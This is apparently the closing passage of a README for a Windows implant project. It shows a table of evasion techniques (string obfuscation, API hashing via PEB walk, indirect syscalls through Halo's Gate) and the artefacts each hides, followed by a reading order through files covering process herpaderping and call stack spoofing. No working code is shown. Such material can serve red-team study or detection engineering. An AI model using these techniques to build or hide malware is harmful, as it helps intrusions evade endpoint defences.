| Thread resume | `ResumeThread(hThread)` | Ghost process primary thread resumes; no separate cross-process thread creation event |
| String obfuscation | `OBFSTR()` / `OBFWSTR()` | `svchost.exe`, `kernel32.dll`, `RuntimeBroker.exe`, `C:\Windows\System32` not present as plaintext in binary |
| API hash resolution | `GetNtdllBase()` PEB walk → `RESOLVE_API()` DJB2 EAT | ntdll APIs resolved by hash; no `GetProcAddress("ApiName")` call |
| Indirect syscall | `INDIRECT_SYSCALL` × 1 (Halo's Gate) | `syscall` instruction executes from ntdll gadget (`0F 05 C3`), not from stub page or PE |

---

## Reading Order

1. `CWLImplant.cpp`: read `wmain()`, `GetPayloadBuffer()`, then `Herpaderping()` in order.
2. `obfstr.h`: understand compile-time XOR string obfuscation.
3. `api_hash.h`: understand PEB walk for module base, DJB2 EAT hash resolution, and pre-computed hash constants.
4. `syscall.h`: understand Halo's Gate SSN resolution, `syscall;ret` gadget scan, and stub builder for `NtCreateUserProcess`. Note: the pool supports up to 8 stubs but only 1 is used; several hash constants in `api_hash.h` (e.g. `NtCreateSection`, `NtCreateProcessEx`) are defined but unused — leftover from a prior implementation.
5. `StackSpoof.cpp`: understand `GetModuleInformation`-based image scan, gadget pattern matching, and return-address slot manipulation.
6. `CWLInc.h`: consult NT structure typedefs (`RTL_USER_PROCESS_PARAMETERS`, `PEB`, `PS_CREATE_INFO`, `PS_ATTRIBUTE_LIST`, `_NtCreateUserProcess`) when call signatures are unclear.
